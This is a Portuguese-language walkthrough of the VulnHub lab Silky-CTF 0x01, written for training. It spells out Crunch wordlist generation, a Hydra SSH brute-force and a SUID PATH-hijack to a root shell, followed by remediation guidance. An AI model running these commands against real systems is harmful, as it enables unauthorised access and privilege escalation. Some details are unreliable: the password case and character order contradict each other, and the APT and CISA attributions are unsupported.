# Silky-CTF: 0x01 — O Bilhete Alemão Que Resolveu o Caso

Bora rapaziada!! Silky-CTF 0x01 é uma joia esquecida que encadeia três movimentos inteligentes: um bilhete em alemão sugerindo caracteres de senha ausentes, geração de wordlist direcionada com Crunch e um binário SUID com vulnerabilidade de PATH hijacking. Sem CVE necessário, sem Metasploit, pura técnica. A fase de enumeração web recompensa quem realmente lê o `robots.txt` e o código-fonte em vez de ir direto para scanners automatizados. Uma das boxes de iniciante mais limpas para ensinar os fundamentos de ataques direcionados de credenciais. Parabéns ao criador, top demais!

| Campo | Valor |
|---|---|
| **Nível** | Iniciante |
| **VM Alvo** | Silky-CTF: 0x01 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/silky-ctf-0x01,536/ |
| **Técnicas** | Enumeração de rede, divulgação via robots.txt, extração de credenciais de JavaScript, geração de wordlist direcionada com Crunch, brute-force SSH com Hydra, análise de binário SUID com strings, escalonamento de privilégios via PATH hijacking |
| **CVEs** | CWE-200 (Exposição de Informação via JavaScript), CWE-522 (Credenciais Insuficientemente Protegidas), CWE-269 (Gestão Inadequada de Privilégios via SUID) |
| **Grupos APT** | APT28 (Fancy Bear): extrai regularmente credenciais parciais de JavaScript e arquivos de configuração durante reconhecimento web; FIN7: usa geração de wordlist direcionada contra endpoints SSH após coletar fragmentos de credenciais de ativos web |

---

## Resumo do Ataque

```
netdiscover / nmap
  → porta 22 (SSH OpenSSH), porta 8080 (HTTP)
  → robots.txt: Disallow: /notes.txt
  → notes.txt: "senha com os últimos 2 caracteres faltando" (alemão)
  → código-fonte da página → script.js → senha parcial: "s1lKy"
  → crunch 7 7 -t s1lKy^% → wordlist direcionada
  → hydra -l silky -P pass.txt 192.168.1.106 ssh
  → credenciais: silky:s1lky#5
  → ssh silky@192.168.1.106
  → encontrar SUID: /usr/bin/sky
  → strings /usr/bin/sky → chama "whoami" por caminho relativo
  → echo '/bin/sh' > /tmp/whoami && chmod +x /tmp/whoami
  → export PATH=/tmp:$PATH && /usr/bin/sky
  → uid=0(root) → cat /root/flag.txt
```

---

## Metodologia

1. Descoberta de host no segmento de rede local
2. Scan completo de portas com detecção de serviço e versão
3. Enumeração web: robots.txt, código-fonte da página, inspeção de arquivo JavaScript
4. Geração de wordlist direcionada com Crunch baseada em credencial parcial descoberta
5. Brute-force SSH com Hydra usando wordlist gerada
6. Acesso inicial via SSH com credenciais descobertas
7. Descoberta de binário SUID e análise comportamental com `strings`
8. PATH hijacking para escalar de `silky` para root
9. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

Identificar o alvo na sub-rede local, mano:

```bash
netdiscover
# ou: sudo netdiscover -r 192.168.1.0/24
```

Scan completo de serviços:

```bash
export TARGET=192.168.1.106
nmap -A $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
8080/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: SSH e HTTP em porta não padrão (8080). Anote a porta: ferramentas de brute-force de diretórios precisam da porta explicitada.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Acesse `http://$TARGET:8080/`. A página inicial não mostra credenciais imediatamente. Verifique os dois pontos de descoberta padrão em CTF:

**robots.txt:**

```bash
curl -s http://$TARGET:8080/robots.txt
```

```
User-agent: *
Disallow: /notes.txt
```

**notes.txt:**

```bash
curl -s http://$TARGET:8080/notes.txt
```

Conteúdo (em alemão): *"Das Passwort wurde von dieser Seite entfernt; die letzten 2 Zeichen fehlen."*

Tradução: "A senha foi removida desta página; os últimos 2 caracteres estão faltando."

**Inspeção do código-fonte da página:**

```bash
curl -s http://$TARGET:8080/ | grep -E "src=|script"
# Siga todos os arquivos .js referenciados
curl -s http://$TARGET:8080/script.js | grep -i "pass\|cred\|key\|secret"
```

`script.js` contém a string de senha parcial:

```javascript
var key = "s1lKy";
```

Dois caracteres estão faltando no final. A dica diz: último caractere é um símbolo, penúltimo é um dígito (baseado no padrão de uso do Crunch).

**Nota real:** Credenciais parciais armazenadas em JavaScript no lado do cliente são uma vulnerabilidade crítica. Desenvolvedores frequentemente "sanitizam" credenciais removendo apenas os últimos caracteres enquanto mantêm o resto no código-fonte, acreditando que isso fornece segurança. Não fornece. O APT28 tem como alvo específico arquivos JavaScript durante o reconhecimento web para coletar fragmentos de credenciais antes de pivotar para ataques de brute-force.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Geração de Wordlist Direcionada com Crunch

Com a credencial parcial `s1lKy` (5 caracteres) e o conhecimento de que a senha completa tem 7 caracteres com os últimos 2 sendo símbolo+dígito, gere uma wordlist direcionada:

```bash
# Placeholders de caracteres do Crunch:
# ^ = caractere especial/símbolo (!, @, #, $, %, ^, &, *, etc.)
# % = dígito (0-9)
crunch 7 7 -t s1lKy^% -o /tmp/silky_pass.txt
```

Gera uma wordlist com cada combinação possível de símbolo+dígito para o 6º e 7º caracteres. O total é aproximadamente 330 candidatos (33 símbolos × 10 dígitos), tornando o brute-force trivialmente rápido.

**Por que isso importa:** A geração de wordlist direcionada contra um padrão de credencial conhecido reduz o espaço de ataque de bilhões de possibilidades para centenas. É exatamente assim que atacantes reais operam quando obtêm credenciais parciais de vazamentos de código-fonte, campanhas de phishing ou fragmentos de bancos de dados vazados. Caramba, é impressionante como uma única variável JavaScript pode entregar todo o engajamento!

**MITRE ATT&CK:** T1110.002 — Força Bruta: Cracking de Senhas

---

## Passo 4 — Brute-Force SSH com Hydra

A base de senha parcial `s1lKy` sugere fortemente que o nome de usuário é `silky`. Use o Hydra para fazer brute-force do SSH:

```bash
hydra -l silky -P /tmp/silky_pass.txt $TARGET ssh -t 4 -V
```

```
[22][ssh] host: 192.168.1.106   login: silky   password: s1lky#5
```

**Credenciais encontradas:** `silky : s1lky#5`

**Alternativa** com Medusa:

```bash
medusa -h $TARGET -u silky -P /tmp/silky_pass.txt -M ssh -t 4
```

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 5 — Acesso Inicial via SSH

Autentique com as credenciais descobertas:

```bash
ssh silky@$TARGET
# Senha: s1lky#5
```

Shell obtido como `silky`. Enumere o ambiente:

```bash
whoami && id
uname -a
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/silky/
```

**MITRE ATT&CK:** T1078 — Contas Válidas; T1021.004 — Serviços Remotos: SSH

---

## Passo 6 — Descoberta e Análise de Binário SUID

Enumere binários SUID no sistema:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binário não padrão descoberto: `/usr/bin/sky`

Analise seu comportamento sem executá-lo:

```bash
strings /usr/bin/sky
```

A saída revela chamadas para `echo` e `whoami` por caminho relativo (não `/bin/echo` ou `/usr/bin/whoami`). Esta é a vulnerabilidade de PATH hijacking.

**Por que o PATH hijacking em SUID funciona:** Quando um binário SUID executa um comando apenas pelo nome (ex.: `whoami`), o SO pesquisa diretórios na variável de ambiente `PATH` em ordem. Se colocarmos um diretório gravável (como `/tmp`) antes do `PATH` e colocarmos um script `whoami` malicioso lá, o binário SUID executará nosso script com os privilégios do proprietário (root).

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1548.001 — Abuso de Controle de Elevação: Setuid

---

## Passo 7 — Escalonamento de Privilégios via PATH Hijacking

```bash
# Criar substituto malicioso para o comando que o binário SUID chama
echo '/bin/sh' > /tmp/whoami
chmod 777 /tmp/whoami

# Verificar o arquivo
cat /tmp/whoami
ls -la /tmp/whoami

# Adicionar /tmp na frente do PATH
export PATH=/tmp:$PATH

# Executar o binário SUID
/usr/bin/sky
```

O binário SUID executa `whoami` de `/tmp`, que roda `/bin/sh` com o EUID do proprietário do binário (root), gerando um shell root.

```bash
id
# uid=1001(silky) gid=1001(silky) euid=0(root)
# ou: uid=0(root) gid=0(root)
```

**Nota real:** PATH hijacking em binários SUID é um achado clássico em avaliações de escalonamento de privilégios Linux. Aparece em ambientes onde desenvolvedores escrevem scripts de implantação ou ferramentas internas com permissões SUID e usam nomes relativos de comandos. O FIN7 usa essa técnica na pós-exploração Linux quando o escalonamento mais sofisticado não está disponível. A correção é simples e permanente: use caminhos absolutos para cada chamada de sistema em qualquer binário com permissões elevadas.

**MITRE ATT&CK:** T1574.007 — Sequestro de Fluxo de Execução: Interceptação por Variável PATH; T1548.001 — Abuso de Controle de Elevação: Setuid

---

## Passo 8 — Captura da Flag Root

```bash
id
cd /root
cat flag.txt
```

(☞ﾟヮﾟ)☞ Root. Véi, que corrente linda! top demais essa box!

**MITRE ATT&CK:** T1005 — Dados do Sistema Local

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial parcial | `s1lKy` | `script.js` no web root | Base para geração de wordlist |
| Credencial completa | `silky:s1lky#5` | Brute-force SSH com Hydra | Acesso inicial via SSH |
| Binário SUID | `/usr/bin/sky` | Enumeração SUID | Vetor de PATH hijacking |
| Flag root | (varia) | /root/flag.txt | Prova de comprometimento |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Credenciais parciais em JavaScript do lado do cliente | Desenvolvedores acreditam que ofuscação parcial fornece segurança; atacantes usam fragmentos de credenciais para brute-force direcionado | Nunca armazene nenhum fragmento de credencial no código do lado do cliente |
| 2 | robots.txt divulga caminho sensível | robots.txt é mecanismo de divulgação, não controle de acesso; cada caminho proibido torna-se alvo de enumeração prioritário | Remova caminhos internos do robots.txt; use autenticação em diretórios sensíveis |
| 3 | Binário SUID usando caminhos relativos | PATH hijacking em binários SUID é achado consistente em pentests Linux | Audite todos os binários SUID com `strings`; use caminhos absolutos; remova SUID de binários que não precisam |
| 4 | Senha SSH fraca e adivinhável | Senhas curtas com padrões simples são vulneráveis a brute-force mesmo sem vazamento completo | Exija mínimo 12 caracteres; implemente bloqueio de conta após 5 tentativas falhas; prefira autenticação por chave |
| 5 | Sem proteção contra brute-force SSH | Hydra roda sem nenhuma limitação ou bloqueio | Implemente fail2ban; configure MaxAuthTries no sshd_config |

---

## MITRE ATT&CK Mapeamento

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Credenciais | Força Bruta: Cracking | T1110.002 |
| Acesso a Credenciais | Credenciais | Força Bruta: Adivinhação | T1110.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Escalonamento | Escalonamento | Abuso de Controle: Setuid | T1548.001 |
| Evasão de Defesa | Evasão | Interceptação por Variável PATH | T1574.007 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover fragmentos de credenciais do JavaScript**: nunca armazene dados de autenticação no lado do cliente; implemente validação de credenciais exclusivamente no lado do servidor
2. **Remover caminhos internos do robots.txt**: mova diretórios sensíveis para trás de autenticação; não anuncie sua existência
3. **Reescrever `/usr/bin/sky` com caminhos absolutos**: substituir todas as chamadas de comandos relativos por caminhos completos; remover SUID se não necessário
4. **Impor proteção contra brute-force SSH**: configurar `fail2ban` para SSH; definir `MaxAuthTries 3` no `sshd_config`
5. **Impor política de senha forte**: mínimo de 12 caracteres, requisitos de complexidade; preferir autenticação SSH por chave

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Auditar todos os arquivos JavaScript acessíveis pela web para exposição de credenciais |
| Proteger | Controle de Acesso | Desabilitar auth SSH por senha; implantar fail2ban |
| Proteger | Segurança de Dados | Remover credenciais e dicas do código do lado do cliente |
| Detectar | Anomalias e Eventos | Alertar sobre brute-force SSH (múltiplas falhas de mesmo IP) |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais descobertas; auditar todos os binários SUID |
| Recuperar | Planejamento de Recuperação | Reconstruir sistema afetado; corrigir binário SUID |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Autenticar todos os endpoints web sensíveis |
| AC-6 | Menor Privilégio | Remover bits SUID desnecessários de binários do sistema |
| IA-5 | Gestão de Autenticadores | Impor credenciais SSH fortes; preferir autenticação por chave |
| SI-10 | Validação de Entrada | Validar todas as entradas em binários SUID; usar caminhos absolutos |
| CM-7 | Menor Funcionalidade | Desabilitar autenticação por senha no SSH |
| SC-28 | Proteção de Informações em Repouso | Nunca armazenar credenciais em arquivos do lado do cliente |

### CISA KEV

O padrão de exposição de credenciais (parciais em JavaScript) se alinha com o Alerta CISA AA20-099A descrevendo atores de ameaça coletando fragmentos de credenciais de aplicações web para montar ataques de brute-force direcionados contra serviços SSH expostos à internet.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos (ASSET) | Gerenciar Software | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (remover fragmentos de credenciais do código cliente; proteger robots.txt)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (auditar binários SUID; usar caminhos absolutos)
- **D3-NTF** — Filtragem de Tráfego de Rede (limitar taxa de tentativas SSH; implantar fail2ban)

---

## Pensamentos Finais

Silky-CTF 0x01 é uma das melhores boxes de iniciante para ensinar ataques direcionados de credenciais, mano. O bilhete em alemão é um toque criativo que força você a traduzir e pensar antes de jogar suas wordlists usuais. A combinação Crunch + Hydra é uma habilidade que se traduz diretamente para engajamentos reais onde você tem vazamentos parciais de credenciais de campanhas de phishing ou repositórios de código-fonte.

O privesc com PATH hijacking é limpo, educativo e imediatamente aplicável. Essa box merece mais reconhecimento na categoria "fundamentos". Design sensacional, véi, top demais mesmo!

Thanks guys!! (❍ᴥ❍ʋ)
